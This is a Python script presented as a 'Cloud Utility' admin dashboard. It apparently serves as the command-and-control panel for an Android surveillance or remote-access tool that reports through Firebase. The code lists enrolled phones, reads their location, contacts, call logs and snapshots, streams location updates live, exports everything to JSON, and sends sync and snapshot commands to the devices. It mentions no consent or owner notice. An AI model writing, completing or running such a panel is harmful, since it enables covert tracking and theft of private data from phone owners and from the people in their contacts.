#!/usr/bin/env python3
"""
Cloud Utility - Admin Dashboard Controller
Python script to monitor and control Android devices via Firebase Realtime Database
"""

import os
import json
import time
import firebase_admin
from firebase_admin import credentials, db
from datetime import datetime
from typing import Dict, List, Any, Optional
import threading
import queue

class CloudUtilityDashboard:
    """
    Dashboard for monitoring and controlling Android devices
    Connected to Firebase Realtime Database
    """
    
    def __init__(self, credentials_path: str, database_url: str):
        """
        Initialize Firebase connection
        
        Args:
            credentials_path: Path to Firebase service account JSON
            database_url: Firebase Realtime Database URL
        """
        self.database_url = database_url
        self.credentials_path = credentials_path
        
        # Initialize Firebase
        cred = credentials.Certificate(credentials_path)
        firebase_admin.initialize_app(cred, {
            'databaseURL': database_url
        })
        
        # Get root reference
        self.root_ref = db.reference('/')
        self.devices_ref = self.root_ref.child('devices')
        
        # Event queue for real-time updates
        self.event_queue = queue.Queue()
        
        # Track monitored devices
        self.monitored_devices = {}
        
        print(f"[✓] Connected to Firebase: {database_url}")
    
    def list_devices(self) -> List[str]:
        """List all registered devices"""
        devices = self.devices_ref.get()
        if devices:
            device_list = list(devices.keys())
            print(f"\n[📱] Found {len(device_list)} device(s):")
            for i, device_id in enumerate(device_list, 1):
                device_data = devices[device_id]
                status = device_data.get('status', 'unknown')
                model = device_data.get('device_info', {}).get('model', 'unknown')
                print(f"  {i}. ID: {device_id[:12]}... | Status: {status} | Model: {model}")
            return device_list
        else:
            print("\n[ℹ️] No devices registered yet")
            return []
    
    def get_device_telemetry(self, device_id: str) -> Optional[Dict]:
        """Get current telemetry data for a device"""
        telemetry = self.devices_ref.child(device_id).child('telemetry').child('current').get()
        if telemetry:
            print(f"\n[📊] Telemetry for device: {device_id[:12]}...")
            print(json.dumps(telemetry, indent=2))
            return telemetry
        else:
            print(f"[⚠️] No telemetry data for device: {device_id[:12]}...")
            return None
    
    def get_device_location(self, device_id: str) -> Optional[Dict]:
        """Get current location for a device"""
        location = self.devices_ref.child(device_id).child('location').child('current').get()
        if location:
            print(f"\n[📍] Location for device: {device_id[:12]}...")
            print(f"  Latitude: {location.get('latitude')}")
            print(f"  Longitude: {location.get('longitude')}")
            print(f"  Accuracy: {location.get('accuracy')} meters")
            print(f"  Updated: {location.get('timestamp')}")
            return location
        else:
            print(f"[⚠️] No location data for device: {device_id[:12]}...")
            return None
    
    def get_device_contacts(self, device_id: str) -> Optional[List]:
        """Get synced contacts for a device"""
        contacts = self.devices_ref.child(device_id).child('logs').child('contacts').get()
        if contacts:
            print(f"\n[👤] Contacts for device: {device_id[:12]}...")
            print(f"  Total contacts: {len(contacts)}")
            for i, contact in enumerate(contacts[:5], 1):  # Show first 5
                print(f"  {i}. {contact.get('name')} - {contact.get('phone')}")
            if len(contacts) > 5:
                print(f"  ... and {len(contacts) - 5} more")
            return contacts
        else:
            print(f"[⚠️] No contacts synced for device: {device_id[:12]}...")
            return None
    
    def get_device_call_logs(self, device_id: str) -> Optional[List]:
        """Get synced call logs for a device"""
        call_logs = self.devices_ref.child(device_id).child('logs').child('call_logs').get()
        if call_logs:
            print(f"\n[📞] Call logs for device: {device_id[:12]}...")
            print(f"  Total calls: {len(call_logs)}")
            for i, log in enumerate(call_logs[:5], 1):  # Show first 5
                print(f"  {i}. {log.get('type')} | {log.get('number')} | {log.get('date')}")
            if len(call_logs) > 5:
                print(f"  ... and {len(call_logs) - 5} more")
            return call_logs
        else:
            print(f"[⚠️] No call logs synced for device: {device_id[:12]}...")
            return None
    
    def send_command(self, device_id: str, command: str, params: Dict = None) -> str:
        """
        Send a command to a device
        
        Args:
            device_id: Device identifier
            command: Command to execute
            params: Additional parameters
        
        Returns:
            Task ID for tracking
        """
        if params is None:
            params = {}
        
        tasks_ref = self.devices_ref.child(device_id).child('tasks')
        
        # Create new task
        task_data = {
            'command': command,
            'status': 'pending',
            'created_at': {'.sv': 'timestamp'},
            'params': params
        }
        
        new_task_ref = tasks_ref.push(task_data)
        task_id = new_task_ref.key
        
        print(f"[✓] Command sent to device {device_id[:12]}...")
        print(f"  Command: {command}")
        print(f"  Task ID: {task_id}")
        print(f"  Status: pending")
        
        return task_id
    
    def get_task_status(self, device_id: str, task_id: str) -> Optional[Dict]:
        """Get status of a task"""
        task = self.devices_ref.child(device_id).child('tasks').child(task_id).get()
        if task:
            print(f"\n[📋] Task Status:")
            print(f"  Device: {device_id[:12]}...")
            print(f"  Task ID: {task_id}")
            print(f"  Command: {task.get('command')}")
            print(f"  Status: {task.get('status')}")
            print(f"  Created: {task.get('created_at')}")
            return task
        else:
            print(f"[⚠️] Task not found: {task_id}")
            return None
    
    def get_device_snapshots(self, device_id: str, limit: int = 5) -> Optional[List]:
        """Get recent device snapshots"""
        snapshots = self.devices_ref.child(device_id).child('snapshots').get()
        if snapshots:
            print(f"\n[📸] Snapshots for device: {device_id[:12]}...")
            print(f"  Total snapshots: {len(snapshots)}")
            
            # Sort by timestamp (keys may be in order)
            snapshot_items = list(snapshots.items())[:limit]
            for i, (snapshot_id, snapshot_data) in enumerate(snapshot_items, 1):
                telemetry = snapshot_data.get('telemetry', {})
                print(f"  {i}. Battery: {telemetry.get('battery_percentage')}% | "
                      f"Timestamp: {snapshot_data.get('timestamp')}")
            return list(snapshots.values())
        else:
            print(f"[⚠️] No snapshots available")
            return None
    
    def sync_all(self, device_id: str):
        """Trigger full sync on a device"""
        print(f"\n[🔄] Triggering full sync...")
        return self.send_command(device_id, 'sync_all')
    
    def sync_contacts(self, device_id: str):
        """Trigger contacts sync"""
        print(f"\n[👤] Triggering contacts sync...")
        return self.send_command(device_id, 'sync_contacts')
    
    def sync_call_logs(self, device_id: str):
        """Trigger call logs sync"""
        print(f"\n[📞] Triggering call logs sync...")
        return self.send_command(device_id, 'sync_call_logs')
    
    def sync_location(self, device_id: str):
        """Trigger location sync"""
        print(f"\n[📍] Triggering location sync...")
        return self.send_command(device_id, 'sync_location')
    
    def take_snapshot(self, device_id: str):
        """Take device snapshot"""
        print(f"\n[📸] Taking device snapshot...")
        return self.send_command(device_id, 'trigger_snapshot')
    
    def monitor_device(self, device_id: str):
        """
        Monitor a device for real-time updates
        
        Args:
            device_id: Device identifier to monitor
        """
        if device_id in self.monitored_devices:
            print(f"[⚠️] Already monitoring device: {device_id[:12]}...")
            return
        
        print(f"[👁️] Starting to monitor device: {device_id[:12]}...")
        
        def telemetry_listener(event):
            """Callback for telemetry updates"""
            if event.data:
                print(f"\n[📊] Telemetry Update - {datetime.now().strftime('%H:%M:%S')}")
                print(f"  Device: {device_id[:12]}...")
                print(f"  Battery: {event.data.get('battery_percentage')}%")
                print(f"  Memory: {event.data.get('memory_percentage')}%")
                print(f"  Network: {event.data.get('network_type')}")
        
        def location_listener(event):
            """Callback for location updates"""
            if event.data:
                print(f"\n[📍] Location Update - {datetime.now().strftime('%H:%M:%S')}")
                print(f"  Device: {device_id[:12]}...")
                print(f"  Lat: {event.data.get('latitude')}")
                print(f"  Lng: {event.data.get('longitude')}")
                print(f"  Accuracy: {event.data.get('accuracy')}m")
        
        def task_listener(event):
            """Callback for task status updates"""
            if event.data:
                print(f"\n[📋] Task Update - {datetime.now().strftime('%H:%M:%S')}")
                print(f"  Device: {device_id[:12]}...")
                print(f"  Status: {event.data.get('status')}")
        
        # Register listeners
        telemetry_ref = self.devices_ref.child(device_id).child('telemetry').child('current')
        location_ref = self.devices_ref.child(device_id).child('location').child('current')
        tasks_ref = self.devices_ref.child(device_id).child('tasks')
        
        telemetry_ref.listen(telemetry_listener)
        location_ref.listen(location_listener)
        tasks_ref.listen(task_listener)
        
        self.monitored_devices[device_id] = {
            'telemetry': telemetry_ref,
            'location': location_ref,
            'tasks': tasks_ref
        }
        
        print(f"[✓] Monitoring active. Press Ctrl+C to stop.")
    
    def stop_monitoring(self, device_id: str):
        """Stop monitoring a device"""
        if device_id in self.monitored_devices:
            print(f"[👁️] Stopping monitoring for device: {device_id[:12]}...")
            self.monitored_devices[device_id]['telemetry'].unlisten()
            self.monitored_devices[device_id]['location'].unlisten()
            self.monitored_devices[device_id]['tasks'].unlisten()
            del self.monitored_devices[device_id]
            print(f"[✓] Monitoring stopped")
    
    def export_device_data(self, device_id: str, output_file: str):
        """Export all device data to JSON file"""
        device_data = self.devices_ref.child(device_id).get()
        if device_data:
            with open(output_file, 'w') as f:
                json.dump(device_data, f, indent=2, default=str)
            print(f"[✓] Device data exported to: {output_file}")
        else:
            print(f"[⚠️] No data found for device: {device_id[:12]}...")

def print_menu():
    """Display main menu"""
    print("\n" + "="*50)
    print("    CLOUD UTILITY - ADMIN DASHBOARD")
    print("="*50)
    print("1. List all devices")
    print("2. View device telemetry")
    print("3. View device location")
    print("4. View device contacts")
    print("5. View device call logs")
    print("6. Send command to device")
    print("7. Monitor device (real-time)")
    print("8. Take device snapshot")
    print("9. Export device data")
    print("10. View recent snapshots")
    print("0. Exit")
    print("="*50)

def main():
    """Main dashboard loop"""
    
    # Configuration
    CREDENTIALS_PATH = "serviceAccountKey.json"  # Update with your path
    DATABASE_URL = "https://android-ret-default-rtdb.firebaseio.com"
    # Update with your URL
    
    # Check if credentials file exists
    if not os.path.exists(CREDENTIALS_PATH):
        print(f"[❌] Credentials file not found: {CREDENTIALS_PATH}")
        print("Please download your Firebase service account key and save it as 'serviceAccountKey.json'")
        return
    
    try:
        # Initialize dashboard
        dashboard = CloudUtilityDashboard(CREDENTIALS_PATH, DATABASE_URL)
        
        # Monitoring thread reference
        monitoring_thread = None
        
        while True:
            print_menu()
            choice = input("\n[👉] Enter your choice: ").strip()
            
            if choice == '0':
                print("\n[👋] Goodbye!")
                break
            
            elif choice == '1':
                dashboard.list_devices()
            
            elif choice in ['2', '3', '4', '5', '7', '8', '9', '10']:
                devices = dashboard.list_devices()
                if devices:
                    device_index = input("[📱] Enter device number (or 0 to cancel): ").strip()
                    try:
                        idx = int(device_index)
                        if 0 < idx <= len(devices):
                            device_id = devices[idx - 1]
                            
                            if choice == '2':
                                dashboard.get_device_telemetry(device_id)
                            elif choice == '3':
                                dashboard.get_device_location(device_id)
                            elif choice == '4':
                                dashboard.get_device_contacts(device_id)
                            elif choice == '5':
                                dashboard.get_device_call_logs(device_id)
                            elif choice == '7':
                                # Start monitoring in a separate thread
                                def monitor():
                                    dashboard.monitor_device(device_id)
                                    try:
                                        while True:
                                            time.sleep(1)
                                    except KeyboardInterrupt:
                                        dashboard.stop_monitoring(device_id)
                                
                                print("[🔄] Starting real-time monitoring (Ctrl+C to stop)...")
                                monitoring_thread = threading.Thread(target=monitor, daemon=True)
                                monitoring_thread.start()
                                monitoring_thread.join()
                            
                            elif choice == '8':
                                dashboard.take_snapshot(device_id)
                            
                            elif choice == '9':
                                filename = f"device_{device_id[:12]}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                                dashboard.export_device_data(device_id, filename)
                            
                            elif choice == '10':
                                dashboard.get_device_snapshots(device_id)
                        else:
                            print("[⚠️] Invalid device number")
                    except ValueError:
                        print("[⚠️] Invalid input")
            
            elif choice == '6':
                devices = dashboard.list_devices()
                if devices:
                    device_index = input("[📱] Enter device number: ").strip()
                    try:
                        idx = int(device_index)
                        if 0 < idx <= len(devices):
                            device_id = devices[idx - 1]
                            
                            print("\n[📋] Available commands:")
                            print("  1. sync_contacts - Sync contacts")
                            print("  2. sync_call_logs - Sync call logs")
                            print("  3. sync_location - Sync location")
                            print("  4. sync_all - Full sync")
                            print("  5. trigger_snapshot - Take snapshot")
                            
                            cmd_choice = input("[⌨️] Enter command number: ").strip()
                            commands = {
                                '1': 'sync_contacts',
                                '2': 'sync_call_logs',
                                '3': 'sync_location',
                                '4': 'sync_all',
                                '5': 'trigger_snapshot'
                            }
                            
                            if cmd_choice in commands:
                                dashboard.send_command(device_id, commands[cmd_choice])
                            else:
                                print("[⚠️] Invalid command")
                    except ValueError:
                        print("[⚠️] Invalid input")
            
            else:
                print("[⚠️] Invalid choice")
    
    except KeyboardInterrupt:
        print("\n[👋] Dashboard terminated by user")
    except Exception as e:
        print(f"[❌] Error: {e}")

if __name__ == "__main__":
    main()
